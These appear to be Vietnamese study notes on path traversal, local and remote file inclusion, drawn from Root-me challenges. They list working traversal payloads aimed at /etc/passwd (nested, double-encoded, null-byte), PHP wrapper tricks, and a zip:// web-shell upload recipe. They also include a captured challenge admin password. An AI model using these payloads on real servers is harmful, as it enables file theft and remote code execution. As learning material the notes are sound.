# Path traversal: cho phép đọc các tệp tùy ý trên máy chủ đang chạy ứng dụng sau cùng kiểm soát hoàn toàn máy chủ.
+window : sharefolder 
Các loại bypass trong path traversal::

- ../ trả về thư mục cha
+  ../../../etc/passwd
- Đường dẫn trực tiếp  /etc/passwd
- Lồng ../ : ....//....//....//etc/passwd
        or: ...\/....\/....\/etc/passwd
- Encode / = %252f: (2lan encode) 

%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66etc%25%32%66passwd

- Null byte: ../../../etc/paswd%00.

Root-me Directory traversal:
+ Kiểm tra với galerie=./
+ Đọc source-code -> galerie/.//86hwnX2r 
+ Test galerie=86hwnX2r -> source-code hiển thị password.txt


# Local file inclusion(LFI): cho phép tấn công(include) các tập tin từ hệ thông của máy chủ web vào trong mã nguỗn ứn dụn web 
- LFI root me:
+ Kiểm tra trên burp suite ta phát hiện có thể truy cập đến /admin
+ Test với ../admin ta thấy được file index.php -> thu được account admin: OpbNJ60xYpvAQU8
- Double Encoding
+ Test double encode với ../ : %252e%252e%252f -> .inc.php
+ Ko thấy gì khi cố gắng ép vào đó %252e%252e%252f
-> Khai thác php wrapper: php://filter/convert.base64-encode/resource=index/home/cv/...
-> thu được mã base64 
- Wrapper
page=view&id=cRv2juwsF
"tmp/upload/cRv2juwsF.jpg"
File upload được lưu trữ vào path với tên được sử thành id
+ Có thể sử dụng wrapper: zip://
("zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php
zip://shell.jpg%23payload.php
" ) xử lý (nội dung)
# Remote file inclusion: Cho phép kẻ tấn công đọc và thực thi từ máy chủ bên ngoài vào trong mã nguồn ứng dụng web mà không được cho phép.(sử dujg url từ xa để chèn mã độc hại)
- Allow_url_include
url?page=http://localhost...
- Wrapper
+ php:// , data:// , zip:// , phar://

Có thể truy cập đến url khác (allow_url_include)
